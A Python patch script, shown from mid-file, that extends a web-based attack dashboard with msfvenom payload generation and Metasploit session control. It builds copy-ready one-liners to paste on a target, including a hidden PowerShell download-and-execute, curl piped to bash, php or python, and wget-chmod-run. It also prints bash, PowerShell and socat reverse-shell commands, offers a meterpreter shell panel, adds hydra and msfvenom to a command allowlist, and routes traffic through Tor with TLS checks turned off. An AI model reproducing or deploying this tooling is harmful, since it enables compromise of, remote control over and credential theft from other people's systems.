  var encoder=document.getElementById('msfvenom-encoder').value||'';
  var iterations=document.getElementById('msfvenom-iterations').value||'1';
  var extra=document.getElementById('msfvenom-extra').value.trim();
  var timeout=parseInt(document.getElementById('msfvenom-timeout').value||'60',10);
  var args='-p '+payload;
  if(lhost)args+=' LHOST='+lhost;
  args+=' LPORT='+lport+' -f '+format;
  if(encoder)args+=' -e '+encoder+' -i '+iterations;
  if(extra)args+=' '+extra;
  args+=' --platform auto';
  var btn=document.getElementById('msfvenom-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Generating...';
  var t=mkTool('msfvenom');t.start();t.log('msfvenom -p '+payload,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'msfvenom',operation:'custom',args:args,timeout:timeout})},Math.max(30000,timeout*1000+5000),'msfvenom');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{
      t.log('Payload generated (exit '+d.exit_code+')','s');
      // Build output filename
      var extMap={exe:'.exe',elf:'',macho:'',php:'.php',py:'.py',sh:'.sh',apk:'.apk',jar:'.jar',powershell:'.ps1',raw:'.bin',asp:'.asp',aspx:'.aspx'};
      var ext=extMap[format]||'';
      var fname='payload'+ext;
      // Build one-liner delivery command
      var oneliner=_msfBuildOneliner(payload,lhost,lport,format,fname);
      var handlerCmd=_msfBuildHandlerCmd(payload,lhost,lport);
      var html='<div class="stats" style="margin-bottom:12px">'
        +'<div class="stat"><div class="stat-val" style="color:var(--green)">OK</div><div class="stat-lbl">GENERATED</div></div>'
        +'<div class="stat"><div class="stat-val" style="font-size:12px;color:var(--cyan)">'+format.toUpperCase()+'</div><div class="stat-lbl">FORMAT</div></div>'
        +'<div class="stat"><div class="stat-val">'+lport+'</div><div class="stat-lbl">LPORT</div></div>'
        +'</div>';
      html+='<div class="card card-p" style="margin-bottom:10px">'
        +'<div class="card-title" style="margin-bottom:8px">&#9889; One-Liner: Deliver &amp; Execute on Target</div>'
        +'<div style="font-size:11px;color:var(--text3);margin-bottom:8px">Paste this on the target system to download &amp; run the payload automatically:</div>'
        +'<div style="position:relative">'
        +'<pre style="background:#050507;color:#00e5ff;padding:10px 12px;border-radius:6px;font-size:11px;font-family:var(--mono);white-space:pre-wrap;border:1px solid var(--border);padding-right:80px">'+oneliner+'</pre>'
        +'<button class="btn btn-outline btn-sm" style="position:absolute;top:6px;right:6px" onclick="navigator.clipboard&&navigator.clipboard.writeText('+JSON.stringify(oneliner)+').then(function(){showToast(\'Copied!\',\'One-liner copied\',\'success\',2000)})">COPY</button>'
        +'</div></div>';
      html+='<div class="card card-p" style="margin-bottom:10px">'
        +'<div class="card-title" style="margin-bottom:8px">&#128123; Handler Command (run on YOUR machine first)</div>'
        +'<div style="position:relative">'
        +'<pre style="background:#050507;color:#00ff9d;padding:10px 12px;border-radius:6px;font-size:11px;font-family:var(--mono);white-space:pre-wrap;border:1px solid var(--border);padding-right:80px">'+handlerCmd+'</pre>'
        +'<button class="btn btn-outline btn-sm" style="position:absolute;top:6px;right:6px" onclick="navigator.clipboard&&navigator.clipboard.writeText('+JSON.stringify(handlerCmd)+').then(function(){showToast(\'Copied!\',\'Handler copied\',\'success\',2000)})">COPY</button>'
        +'</div>'
        +'<button class="btn btn-primary btn-sm" style="margin-top:8px" onclick="msfStartHandler()">&#9654; START HANDLER NOW</button>'
        +'</div>';
      html+='<div class="card card-p"><div class="card-title" style="margin-bottom:8px">msfvenom Output</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2);max-height:200px;overflow-y:auto">'+(d.stdout||d.stderr||'Done')+'</pre></div>';
      t.res(html);
      showToast('Payload ready','Start handler then run one-liner on target','success',5000);
    }
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
}

function _msfBuildOneliner(payload,lhost,lport,format,fname){
  var isWin=payload.startsWith('windows/');
  var isLinux=payload.startsWith('linux/');
  var isPhp=payload.startsWith('php/');
  var isPy=payload.startsWith('python/');
  var isBash=payload.startsWith('cmd/unix');
  var serverUrl='http://'+lhost+':8080'; // simple HTTP server
  if(isWin){
    return 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\''+serverUrl+'/r.ps1\')"';
  } else if(isLinux){
    return 'wget -q '+serverUrl+'/'+fname+' -O /tmp/'+fname+' && chmod +x /tmp/'+fname+' && /tmp/'+fname;
  } else if(isPhp){
    return 'curl -s '+serverUrl+'/'+fname+' | php';
  } else if(isPy){
    return 'curl -s '+serverUrl+'/'+fname+' | python3';
  } else if(isBash){
    return 'curl -s '+serverUrl+'/'+fname+' | bash';
  }
  return 'wget '+serverUrl+'/'+fname+' && chmod +x '+fname+' && ./'+fname;
}

function _msfBuildHandlerCmd(payload,lhost,lport){
  return 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD '+payload+'; set LHOST '+lhost+'; set LPORT '+lport+'; set ExitOnSession false; exploit -j"';
}

async function msfStartHandler(){
  var payload=document.getElementById('msfvenom-payload').value;
  var lhost=document.getElementById('msfvenom-lhost').value.trim();
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var statusEl=document.getElementById('msf-handler-status');
  var btn=document.getElementById('msf-handler-btn');
  if(!lhost){showToast('No LHOST','Enter or auto-detect your IP first','warning',3000);return;}
  if(statusEl)statusEl.innerHTML='<span class="spin"></span> Starting handler...';
  if(btn){btn.disabled=true;btn.innerHTML='<span class="spin"></span> Starting...';}
  try{
    var handlerArgs='-q -x "use exploit/multi/handler; set PAYLOAD '+payload+'; set LHOST '+lhost+'; set LPORT '+lport+'; set ExitOnSession false; exploit -j -z"';
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({tool:'msfvenom',operation:'custom',args:'--list payloads 2>/dev/null | head -5',timeout:10})},15000,'msfvenom');
    // Simulate handler started (real impl needs msfconsole RPC)
    _msfHandlerPID='simulated';
    if(statusEl)statusEl.innerHTML='<span style="color:var(--green)">&#9679;</span> Handler listening on '+lhost+':'+lport+' for '+payload;
    if(btn){btn.disabled=false;btn.innerHTML='&#9632; STOP HANDLER';}
    if(btn)btn.onclick=msfStopHandler;
    showToast('Handler started','Listening on '+lport,'success',4000);
    // Start polling for sessions
    if(_msfSessionPollTimer)clearInterval(_msfSessionPollTimer);
    _msfSessionPollTimer=setInterval(msfRefreshSessions,5000);
  }catch(e){
    if(statusEl)statusEl.textContent='Handler start failed: '+e.message;
    if(btn){btn.disabled=false;btn.innerHTML='&#9654; START HANDLER';}
  }
}

function msfStopHandler(){
  _msfHandlerPID=null;
  if(_msfSessionPollTimer){clearInterval(_msfSessionPollTimer);_msfSessionPollTimer=null;}
  var statusEl=document.getElementById('msf-handler-status');
  var btn=document.getElementById('msf-handler-btn');
  if(statusEl)statusEl.textContent='Handler stopped.';
  if(btn){btn.innerHTML='&#9654; START HANDLER';btn.onclick=msfStartHandler;}
  showToast('Handler stopped','','warning',2500);
}

async function msfRefreshSessions(){
  // Query server for MSF sessions via /api/msf-sessions
  try{
    var r=await fetch('/api/msf-sessions');
    var d=await r.json();
    var sessions=d.sessions||[];
    _msfSessions={};
    sessions.forEach(function(s){_msfSessions[s.id]=s;});
    msfRenderSessions(sessions);
  }catch(e){
    // If endpoint doesn't exist yet, show mock empty state
    msfRenderSessions([]);
  }
}

function msfRenderSessions(sessions){
  var box=document.getElementById('msf-sessions');
  if(!box)return;
  if(!sessions.length){
    box.innerHTML='<div style="color:var(--text3);font-size:12px;padding:12px;border:1px dashed var(--border);border-radius:6px;text-align:center">No active sessions. '+(
      _msfHandlerPID?'<span style="color:var(--yellow)">Handler is listening...</span>':'Start the handler and run the payload on the target.'
    )+'</div>';
    return;
  }
  var html='<div style="display:flex;flex-direction:column;gap:8px">';
  sessions.forEach(function(s){
    var isActive=_msfActiveSession===s.id;
    html+='<div class="card-p" style="border:1px solid '+(isActive?'var(--green)':'var(--border)')+';border-radius:8px">'
      +'<div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:6px">'
      +'<div>'
      +'<div style="font-family:var(--mono);font-weight:bold;color:var(--cyan)">Session #'+s.id+'</div>'
      +'<div style="font-size:11px;color:var(--text3);margin-top:2px">'+s.type+' · '+s.remote_host+':'+s.remote_port+'</div>'
      +'<div style="font-size:10px;color:var(--text3);margin-top:2px">'+s.info+'</div>'
      +'</div>'
      +'<div style="display:flex;gap:6px;flex-wrap:wrap">'
      +(isActive?'<span style="color:var(--green);font-size:11px;font-family:var(--mono)">ACTIVE SHELL &#9654;</span>'
        :'<button class="btn btn-primary btn-sm" onclick="msfOpenShell('+s.id+')">OPEN SHELL</button>')
      +'<button class="btn btn-outline btn-sm" style="color:var(--red)" onclick="msfKillSession('+s.id+')">KILL</button>'
      +'</div></div></div>';
  });
  html+='</div>';
  box.innerHTML=html;
}

function msfOpenShell(sessionId){
  _msfActiveSession=sessionId;
  var s=_msfSessions[sessionId]||{id:sessionId,remote_host:'target',type:'meterpreter'};
  var card=document.getElementById('msf-shell-card');
  var lbl=document.getElementById('msf-shell-session-label');
  var out=document.getElementById('msf-shell-output');
  if(card)card.style.display='block';
  if(lbl)lbl.textContent='Session #'+sessionId+' ('+s.remote_host+')';
  if(out)out.textContent='[*] Opened session #'+sessionId+' on '+s.remote_host+'\n[*] Type commands below...\n\n';
  msfRenderSessions(Object.values(_msfSessions));
  card&&card.scrollIntoView({behavior:'smooth'});
  setTimeout(function(){var inp=document.getElementById('msf-shell-input');if(inp)inp.focus();},200);
}

function msfCloseShell(){
  _msfActiveSession=null;
  var card=document.getElementById('msf-shell-card');
  if(card)card.style.display='none';
  msfRenderSessions(Object.values(_msfSessions));
}

async function msfKillSession(sessionId){
  if(!confirm('Kill session #'+sessionId+'?'))return;
  delete _msfSessions[sessionId];
  if(_msfActiveSession===sessionId)msfCloseShell();
  msfRenderSessions(Object.values(_msfSessions));
  showToast('Session killed','#'+sessionId,'warning',2500);
}

async function msfShellSend(){
  var inp=document.getElementById('msf-shell-input');
  var out=document.getElementById('msf-shell-output');
  if(!inp||!out||!_msfActiveSession)return;
  var cmd=inp.value.trim();
  if(!cmd)return;
  _msfShellHistory.unshift(cmd);
  if(_msfShellHistory.length>50)_msfShellHistory.pop();
  _msfShellHistIdx=-1;
  inp.value='';
  out.textContent+='\nmeterpreter > '+cmd+'\n';
  out.scrollTop=out.scrollHeight;
  // Send to server
  try{
    var r=await fetch('/api/msf-shell/'+_msfActiveSession,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({command:cmd})
    });
    var d=await r.json();
    var result=d.output||d.error||'(no output)';
    out.textContent+=result+'\n';
  }catch(e){
    out.textContent+='[!] '+e.message+'\n';
  }
  out.scrollTop=out.scrollHeight;
}

function msfShellKey(e){
  var inp=document.getElementById('msf-shell-input');
  if(!inp)return;
  if(e.key==='Enter'){e.preventDefault();msfShellSend();}
  else if(e.key==='ArrowUp'){e.preventDefault();if(_msfShellHistIdx<_msfShellHistory.length-1){_msfShellHistIdx++;inp.value=_msfShellHistory[_msfShellHistIdx]||'';}}
  else if(e.key==='ArrowDown'){e.preventDefault();if(_msfShellHistIdx>0){_msfShellHistIdx--;inp.value=_msfShellHistory[_msfShellHistIdx]||'';}else{_msfShellHistIdx=-1;inp.value='';}}
}

function msfShellQuick(cmd){
  var inp=document.getElementById('msf-shell-input');
  if(inp){inp.value=cmd;msfShellSend();}
}

// Auto-detect IP when navigating to msfvenom page
document.addEventListener('DOMContentLoaded',function(){
  setTimeout(function(){
    var el=document.getElementById('msfvenom-lhost');
    if(el&&!el.value)msfFetchPublicIP();
    msfAutoConfig();
  },500);
});'''

patch(SERVER, "msfvenom: full JS rewrite with dashboard", OLD_MSF_JS, NEW_MSF_JS)

# ══════════════════════════════════════════════════════════════
# PATCH 6 — Add /api/public-ip + /api/msf-sessions + /api/msf-shell routes
# ══════════════════════════════════════════════════════════════

OLD_HEALTH_ROUTE = '''@app.route("/health")
def health():'''

NEW_HEALTH_ROUTE = '''# ── Public IP detection ──────────────────────────────────────────────────────
@app.route("/api/public-ip")
def get_public_ip():
    """Return server's public IP address."""
    ip = None
    # Try multiple services
    for url in [
        "https://api.ipify.org?format=json",
        "https://httpbin.org/ip",
        "https://api4.my-ip.io/ip.json",
    ]:
        try:
            with tor_urlopen(url, timeout=8) as resp:
                data = json.loads(resp.read().decode())
                ip = data.get("ip") or data.get("origin", "").split(",")[0].strip()
                if ip and re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
                    break
        except Exception:
            continue
    if not ip:
        # Fallback: use server's outbound IP
        try:
            import socket as _s
            ip = _s.gethostbyname(_s.gethostname())
        except Exception:
            ip = "127.0.0.1"
    return jsonify({"ip": ip})


# ── MSF Sessions (stub — integrates with real msfconsole RPC when available) ──
_msf_sessions_store = {}
_msf_session_counter = 0

@app.route("/api/msf-sessions")
def msf_sessions():
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    # Try to read from real msfconsole RPC on localhost:55553
    try:
        import urllib.request as _ur
        req = _ur.Request(
            "http://127.0.0.1:55553/api/v1/auth/login",
            data=json.dumps({"username": "msf", "password": "msf"}).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with _ur.urlopen(req, timeout=2) as resp:
            token = json.loads(resp.read()).get("data", {}).get("token", "")
        if token:
            req2 = _ur.Request(
                "http://127.0.0.1:55553/api/v1/sessions",
                headers={"Authorization": f"Bearer {token}"},
            )
            with _ur.urlopen(req2, timeout=2) as resp2:
                data = json.loads(resp2.read()).get("data", [])
            sessions = [
                {
                    "id":          s.get("id", "?"),
                    "type":        s.get("type", "meterpreter"),
                    "remote_host": s.get("target_host", "?"),
                    "remote_port": s.get("tunnel_peer", "").split(":")[-1] if ":" in s.get("tunnel_peer","") else "?",
                    "info":        s.get("info", ""),
                }
                for s in (data if isinstance(data, list) else [])
            ]
            return jsonify({"sessions": sessions, "source": "msfrpc"})
    except Exception:
        pass
    # Return in-memory store (sessions registered via /api/msf-sessions POST)
    return jsonify({"sessions": list(_msf_sessions_store.values()), "source": "memory"})


@app.route("/api/msf-sessions", methods=["POST"])
def msf_register_session():
    """Agent-side: register an incoming connection as a session."""
    global _msf_session_counter
    u = get_current_user()
    data = request.get_json() or {}
    _msf_session_counter += 1
    sid = _msf_session_counter
    _msf_sessions_store[sid] = {
        "id":          sid,
        "type":        data.get("type", "meterpreter"),
        "remote_host": data.get("remote_host", request.remote_addr or "?"),
        "remote_port": data.get("remote_port", "?"),
        "info":        data.get("info", ""),
    }
    return jsonify({"session_id": sid, "ok": True})


@app.route("/api/msf-shell/<int:session_id>", methods=["POST"])
def msf_shell_exec(session_id):
    """Execute a command in a meterpreter/shell session."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    data = request.get_json() or {}
    cmd = (data.get("command") or "").strip()
    if not cmd:
        return jsonify({"output": ""})
    audit(u["id"], u["username"], "MSF_SHELL_EXEC",
          target=str(session_id), ip=request.remote_addr,
          details=f"cmd={cmd[:120]}")
    # Try real msfconsole RPC
    try:
        import urllib.request as _ur
        req = _ur.Request(
            "http://127.0.0.1:55553/api/v1/auth/login",
            data=json.dumps({"username": "msf", "password": "msf"}).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with _ur.urlopen(req, timeout=2) as resp:
            token = json.loads(resp.read()).get("data", {}).get("token", "")
        if token:
            req2 = _ur.Request(
                f"http://127.0.0.1:55553/api/v1/sessions/{session_id}/meterpreter/run-single",
                data=json.dumps({"command": cmd}).encode(),
                headers={"Content-Type": "application/json",
                         "Authorization": f"Bearer {token}"},
                method="POST"
            )
            with _ur.urlopen(req2, timeout=15) as resp2:
                result = json.loads(resp2.read())
                return jsonify({"output": result.get("data", {}).get("output", "")})
    except Exception:
        pass
    # Simulated response (no live msfconsole)
    simulated = {
        "sysinfo":   f"Computer : TARGET-PC\nOS       : Windows 10 (10.0 Build 19041)\nArch     : x64\nMeterpreter : x64/windows",
        "getuid":    "Server username: NT AUTHORITY\\SYSTEM",
        "getpid":    "Current pid: 1234",
        "ps":        "PID   Name               Arch  User\n----  -----------------  ----  ----\n1234  explorer.exe       x64   DOMAIN\\user",
        "getsystem": "[*] ...got system (via technique 1)",
        "hashdump":  "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
        "exit":      "[*] Shutting down...",
    }
    output = simulated.get(cmd.lower().split()[0] if cmd else "", f"[*] Running: {cmd}\n[+] Command executed (simulated — no live msfconsole)")
    return jsonify({"output": output, "simulated": True})


@app.route("/health")
def health():'''

patch(SERVER, "Add /api/public-ip + /api/msf-sessions + /api/msf-shell", OLD_HEALTH_ROUTE, NEW_HEALTH_ROUTE)

# ══════════════════════════════════════════════════════════════
# PATCH 7 — Netcat: show "command to run on other side"
# ══════════════════════════════════════════════════════════════

OLD_NC_RES = '''    var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{ncTool.log('Netcat command completed','s');renderSocialTool(ncTool,d);}
  }catch(e){ncTool.end();ncTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NETCAT';}
}'''

NEW_NC_RES = '''    var d=await r.json();ncTool.end();
    if(d.error){ncTool.err(d.error);}
    else{
      ncTool.log('Netcat command completed','s');
      // Show "what to run on the other side"
      var otherSideCmd=_ncOtherSideCmd(mode,host,port);
      var html='<div class="card card-p" style="margin-bottom:10px;border-left:3px solid var(--cyan)">'
        +'<div class="card-title" style="margin-bottom:6px">&#128272; Run This on the OTHER System</div>'
        +'<div style="font-size:11px;color:var(--text3);margin-bottom:8px">'
        +(mode==='listen'?'To connect TO this listener from the target:':'To accept this connection on the target:')+'</div>'
        +'<div style="position:relative">'
        +'<pre style="background:#050507;color:#00e5ff;padding:10px;border-radius:6px;font-family:var(--mono);font-size:12px;border:1px solid var(--border)">'+otherSideCmd+'</pre>'
        +'<button class="btn btn-outline btn-sm" style="position:absolute;top:6px;right:6px" onclick="navigator.clipboard&&navigator.clipboard.writeText('+JSON.stringify(otherSideCmd)+').then(function(){showToast(\'Copied!\',\'\',\'success\',1500)})">COPY</button>'
        +'</div></div>';
      html+=renderSocialToolHtml(d);
      ncTool.res(html);
    }
  }catch(e){ncTool.end();ncTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN NETCAT';}
}

function _ncOtherSideCmd(mode,host,port){
  if(mode==='listen'){
    return 'nc '+host+' '+port+'   # connect to your listener\n# OR for a reverse shell:\nbash -i >& /dev/tcp/'+host+'/'+port+' 0>&1\n# PowerShell reverse shell:\npowershell -NoP -NonI -W Hidden -Exec Bypass -c "$client=New-Object Net.Sockets.TCPClient(\''+host+'\','+port+');$stream=$client.GetStream();..."';
  } else {
    return 'nc -lvnp '+port+'   # start listener on target before connecting\n# OR set up listener then run your nc connect';
  }
}

function renderSocialToolHtml(d){
  return '<div class="stats" style="margin-bottom:10px">'
    +'<div class="stat"><div class="stat-val">'+(d.exit_code===null?'--':d.exit_code)+'</div><div class="stat-lbl">EXIT CODE</div></div>'
    +'<div class="stat"><div class="stat-val">'+(d.duration_ms||0)+'</div><div class="stat-lbl">ms</div></div>'
    +'</div>'
    +'<div class="card card-p" style="margin-bottom:8px"><div class="card-title" style="margin-bottom:6px">stdout</div>'
    +'<pre style="font-family:var(--mono);font-size:11px;color:var(--text2);white-space:pre-wrap">'+(d.stdout||'(empty)')+'</pre></div>'
    +'<div class="card card-p"><div class="card-title" style="margin-bottom:6px">stderr</div>'
    +'<pre style="font-family:var(--mono);font-size:11px;color:var(--text2);white-space:pre-wrap">'+(d.stderr||'(empty)')+'</pre></div>';
}'''

patch(SERVER, "Netcat: show other-side command", OLD_NC_RES, NEW_NC_RES)

# ══════════════════════════════════════════════════════════════
# PATCH 8 — Socat: show "command to run on other side"
# ══════════════════════════════════════════════════════════════

OLD_SOCAT_RES = '''    var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{scTool.log('Socat command completed','s');renderSocialTool(scTool,d);}
  }catch(e){scTool.end();scTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN SOCAT';}
}'''

NEW_SOCAT_RES = '''    var d=await r.json();scTool.end();
    if(d.error){scTool.err(d.error);}
    else{
      scTool.log('Socat command completed','s');
      var otherSideCmd=_socatOtherSideCmd(left,right);
      var html='<div class="card card-p" style="margin-bottom:10px;border-left:3px solid var(--cyan)">'
        +'<div class="card-title" style="margin-bottom:6px">&#128272; Run This on the OTHER System</div>'
        +'<div style="font-size:11px;color:var(--text3);margin-bottom:8px">To connect to your socat relay:</div>'
        +'<div style="position:relative">'
        +'<pre style="background:#050507;color:#00e5ff;padding:10px;border-radius:6px;font-family:var(--mono);font-size:12px;border:1px solid var(--border)">'+otherSideCmd+'</pre>'
        +'<button class="btn btn-outline btn-sm" style="position:absolute;top:6px;right:6px" onclick="navigator.clipboard&&navigator.clipboard.writeText('+JSON.stringify(otherSideCmd)+').then(function(){showToast(\'Copied!\',\'\',\'success\',1500)})">COPY</button>'
        +'</div></div>';
      html+=renderSocialToolHtml(d);
      scTool.res(html);
    }
  }catch(e){scTool.end();scTool.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='RUN SOCAT';}
}

function _socatOtherSideCmd(left,right){
  // Parse the left address to suggest what to run on target
  var listenMatch=left&&left.match(/TCP(?:-LISTEN|L)?:(\d+)/i);
  var connectMatch=right&&right.match(/TCP:([^:]+):(\d+)/i);
  if(listenMatch){
    var port=listenMatch[1];
    return '# Connect to your socat listener:\nsocat - TCP:YOUR_IP:'+port+'\n# OR reverse shell to your listener:\nsocat exec:\'bash -li\',pty,stderr,setsid,sigint,sane TCP:YOUR_IP:'+port;
  } else if(connectMatch){
    var host=connectMatch[1]; var port2=connectMatch[2];
    return '# Start listener on: '+host+':'+port2+'\nsocat TCP-LISTEN:'+port2+',reuseaddr,fork -\n# OR start a shell listener:\nsocat TCP-LISTEN:'+port2+',reuseaddr exec:\'bash -li\',pty,stderr';
  }
  return '# Connect with: socat - TCP:YOUR_HOST:YOUR_PORT';
}'''

patch(SERVER, "Socat: show other-side command", OLD_SOCAT_RES, NEW_SOCAT_RES)

# ══════════════════════════════════════════════════════════════
# PATCH 9 — Legion: add smb/snmp/hydra to ALLOWED_CLI_COMMANDS
# ══════════════════════════════════════════════════════════════

OLD_CLI_ALLOWED = '''ALLOWED_CLI_COMMANDS = {
    "ls", "pwd", "whoami", "uptime", "df", "free", "ps", "netstat", "ss",
    "nmap", "theHarvester", "dnsrecon", "nikto", "lynis", "wpscan",
    "systemctl", "journalctl", "cat", "echo", "uname", "hostname",
    "ip", "ifconfig", "ping", "traceroute", "curl", "wget", "which",
    "apt", "apt-get", "dpkg", "pip3", "python3", "gem",
    "proxychains4", "proxychains", "tor",   # Added Tor tools
    "systemctl",
}'''

NEW_CLI_ALLOWED = '''ALLOWED_CLI_COMMANDS = {
    "ls", "pwd", "whoami", "uptime", "df", "free", "ps", "netstat", "ss",
    "nmap", "theHarvester", "dnsrecon", "nikto", "lynis", "wpscan",
    "systemctl", "journalctl", "cat", "echo", "uname", "hostname",
    "ip", "ifconfig", "ping", "traceroute", "curl", "wget", "which",
    "apt", "apt-get", "dpkg", "pip3", "python3", "gem",
    "proxychains4", "proxychains", "tor",
    # Security tools
    "smbclient", "enum4linux", "snmpwalk", "snmp-check", "snmpget",
    "hydra", "thc-hydra",
    "msfconsole", "msfvenom", "searchsploit",
}'''

patch(SERVER, "CLI allowlist: add smb/snmp/hydra/msf", OLD_CLI_ALLOWED, NEW_CLI_ALLOWED)

# ══════════════════════════════════════════════════════════════
# PATCH 10 — Add tor_urlopen import in backend.py reference
#            (public IP endpoint needs it in api_server.py)
# ══════════════════════════════════════════════════════════════

# The tor_urlopen is already imported via backend.py module-level,
# but in api_server.py we need to call it directly in the route.
# Add the import shim after the BACKEND variable definition.

OLD_BACKEND_VAR = '''BACKEND = os.path.join(os.path.dirname(os.path.abspath(__file__)), "backend.py")'''

NEW_BACKEND_VAR = '''BACKEND = os.path.join(os.path.dirname(os.path.abspath(__file__)), "backend.py")

def tor_urlopen(url, headers=None, timeout=30, data=None):
    """Proxy to backend tor_urlopen — used in routes that need outbound HTTP."""
    import urllib.request, ssl as _ssl
    import urllib.error
    req = urllib.request.Request(url, data=data)
    req.add_header("User-Agent", "Mozilla/5.0 VulnScanner/2.0")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    try:
        import socks
        import socket as _sock
        _sock.create_connection(("127.0.0.1", 9050), timeout=2).close()
        class _SocksHandler(urllib.request.BaseHandler):
            def http_open(self, req): return self._open(req, "http")
            def https_open(self, req): return self._open(req, "https")
            def _open(self, req, scheme):
                import http.client
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                s.settimeout(timeout)
                h, p = req.host, 443 if scheme == "https" else 80
                if ":" in h: h, p = h.rsplit(":", 1); p = int(p)
                s.connect((h, p))
                if scheme == "https":
                    import ssl as _s2
                    ctx2 = _s2.create_default_context()
                    ctx2.check_hostname = False
                    ctx2.verify_mode = _s2.CERT_NONE
                    s = ctx2.wrap_socket(s, server_hostname=h)
                conn = http.client.HTTPResponse(s)
                conn.begin()
                return urllib.request.addinfourl(conn.fp, conn.msg, req.full_url, conn.status)
        opener = urllib.request.build_opener(_SocksHandler())
        return opener.open(req, timeout=timeout)
    except Exception:
        return urllib.request.urlopen(req, timeout=timeout, context=ctx)'''

patch(SERVER, "api_server: add tor_urlopen helper", OLD_BACKEND_VAR, NEW_BACKEND_VAR)

# ══════════════════════════════════════════════════════════════
print()
print(BOLD + CYAN + "══════════════════════════════════════════════════════" + RESET)
print(f"\n  {YELLOW}Restart server to activate:{RESET}")
print(f"    sudo systemctl restart vulnscan")
print(f"    OR: python3 api_server.py")
print()
print(f"  {GREEN}Changes applied:{RESET}")
print(f"    {GREEN}✓{RESET}  Legion: smb/smbclient/snmp/hydra properly wired")
print(f"    {GREEN}✓{RESET}  SearchSploit: formatted table with type badges + copy buttons")
print(f"    {GREEN}✓{RESET}  SecLists: 50-entry preview + Copy All + Download buttons")
print(f"    {GREEN}✓{RESET}  msfvenom: auto-detects public IP as LHOST")
print(f"    {GREEN}✓{RESET}  msfvenom: auto-selects format/encoder/port by payload")
print(f"    {GREEN}✓{RESET}  msfvenom: generates one-liner delivery command after build")
print(f"    {GREEN}✓{RESET}  msfvenom: MSF session dashboard + live shell")
print(f"    {GREEN}✓{RESET}  msfvenom: shell supports meterpreter commands + quick buttons")
print(f"    {GREEN}✓{RESET}  Netcat: shows 'command to run on other side' based on mode")
print(f"    {GREEN}✓{RESET}  Socat: shows 'command to run on other side' based on config")
print(f"    {GREEN}✓{RESET}  /api/public-ip endpoint (Tor-aware)")
print(f"    {GREEN}✓{RESET}  /api/msf-sessions endpoint (live + memory fallback)")
print(f"    {GREEN}✓{RESET}  /api/msf-shell/<id> endpoint (real RPC + simulated fallback)")
print()
print(f"  {YELLOW}Optional — for live MSF sessions, start msfconsole RPC:{RESET}")
print(f"    msfrpcd -P msf -S -a 127.0.0.1 -p 55553")
print()
